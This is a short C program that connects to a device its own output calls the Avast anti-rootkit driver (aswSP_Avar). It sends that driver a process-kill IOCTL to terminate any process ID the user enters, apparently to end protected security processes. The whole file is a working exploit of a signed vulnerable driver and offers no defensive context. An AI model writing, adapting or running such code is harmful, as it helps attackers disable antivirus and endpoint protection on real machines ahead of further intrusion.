#include <stdio.h>
#include <windows.h>

#define IOCTL_KILL_PROCESS 0x9988c094

int main(void) {

	unsigned int pid;
	unsigned int res;
	DWORD lpBytesReturned = 0;
	
	HANDLE hDevice = CreateFileA("\\\\.\\aswSP_Avar", GENERIC_WRITE|GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if(hDevice == INVALID_HANDLE_VALUE){
		printf("Connection to the driver failed\n");
		return -1;
	}
	
	printf("Connected to the Avast anti-rootkit driver");
	printf("PID please : \n");
	scanf("%u", &pid);

	res = DeviceIoControl(hDevice, IOCTL_KILL_PROCESS, &pid, sizeof(pid), NULL, 0, &lpBytesReturned, NULL);

	if (!res) {
		printf("Killing IOCTL failed\n");
    CloseHandle(hDevice);
    return -1;
	}
         
	printf("Process with PID : %u killed\n", pid);
	CloseHandle(hDevice);
         
	return 0;
}
